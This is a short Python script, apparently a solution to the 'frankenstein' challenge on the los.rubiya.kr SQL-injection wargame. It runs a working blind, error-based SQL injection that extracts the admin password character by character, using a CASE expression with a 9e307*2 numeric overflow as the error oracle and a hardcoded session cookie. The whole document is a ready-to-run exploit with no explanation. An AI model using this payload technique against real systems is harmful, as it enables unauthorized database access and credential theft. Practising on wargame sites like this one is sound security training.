import requests
import string

url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?"
cookie = {'PHPSESSID':'gsbj486cdol37t3rvoo76ngrs8'}

def find_pw():
    passwd = ""
    for i in range(1, 9):
        for j in string.printable:
            query = "pw=' or case when id='admin' and pw like '{}%25' then 9e307*2 else 0 end%23".format(passwd+j)
            if j == "#" or j == "%" or j == "&" or j == "_" or j == "'" or j == '"':
                continue
            print(query)
            res = requests.get(url=url+query, cookies=cookie)
            if "include" in res.text:
                continue
            elif "error" in res.text:
                passwd += j 
                print("PASSWORD CHAR : " + j)
                break
    print("PASSWORD : " + passwd)
if __name__ == "__main__":
    find_pw()
